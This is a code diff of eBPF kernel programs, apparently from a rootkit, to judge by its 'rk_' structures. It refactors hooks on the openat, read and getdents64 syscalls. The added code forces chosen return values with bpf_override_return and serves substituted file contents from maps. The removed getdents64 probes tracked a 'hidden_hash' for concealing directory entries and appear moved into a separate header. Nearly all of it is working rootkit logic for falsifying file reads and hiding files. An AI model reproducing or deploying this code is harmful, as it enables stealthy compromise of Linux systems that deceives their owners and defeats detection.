@@ -8,6 +8,10 @@
 #include "include/bpf_helpers.h"
 
 #include "common.h"
+#include "hash.h"
+
+#include "override_dir_kern.h"
+#include "override_cnt_kern.h"
 
 static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
 {
@@ -144,6 +148,12 @@ int __x64_sys_openat_ret(struct pt_regs *ctx)
     };
     bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);
 
+     if (fd_attr.action.id == OVERRIDE_RETURN_ACTION)
+    {
+        bpf_override_return(ctx, fd_attr.action.return_value);
+        return 0;
+    }
+
     return 0;
 }
 
@@ -195,7 +205,6 @@ int kprobe_sys_read(struct pt_regs *ctx)
     if (fd_attr->action.id == OVERRIDE_RETURN_ACTION)
     {
         bpf_override_return(ctx, fd_attr->action.return_value);
-
         return 0;
     }
 
@@ -264,72 +273,8 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
 
     if (fd_attr->action.id == OVERRIDE_CONTENT_ACTION)
     {
-        struct rk_fd_content_key_t fd_content_key = {
-            .id = fd_attr->action.override_id,
-            .chunk = fd_attr->override_chunk,
-        };
-
-        struct rk_fd_content_t *fd_content = (struct rk_fd_content_t *)bpf_map_lookup_elem(&rk_fd_contents, &fd_content_key);
-        if (fd_content)
-        {
-            bpf_override_return(ctx, fd_content->size);
-        }
-        else
-        {
-            bpf_override_return(ctx, 0);
-        }
-
-        fd_attr->override_chunk++;
+        override_content(ctx, fd_attr);
     }
-
-    return 0;
-}
-
-SEC("kprobe/__x64_sys_getdents64")
-int __x64_sys_getdents64(struct pt_regs *ctx)
-{
-    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
-
-    int fd;
-    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));
-
-    u64 pid_tgid = bpf_get_current_pid_tgid();
-    struct rk_fd_key_t fd_key =
-        {
-            .fd = fd,
-            .pid = pid_tgid >> 32,
-        };
-
-    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
-    if (!fd_attr)
-    {
-        return 0;
-    }
-
-    struct linux_dirent64 *dirent;
-    bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));
-
-    struct rk_getdents_t getdents = {
-        .dirent = dirent,
-        .hidden_hash = fd_attr->action.hidden_hash,
-    };
-
-    bpf_map_update_elem(&rk_getdents, &pid_tgid, &getdents, BPF_ANY);
-
-    return 0;
-}
-
-SEC("kretprobe/__x64_sys_getdents64")
-int __x64_sys_getdents64_ret(struct pt_regs *ctx)
-{
-    u64 pid_tgid = bpf_get_current_pid_tgid();
-    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
-    if (!getdents)
-    {
-        return 0;
-    }
-
-    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS);
 
     return 0;
 }
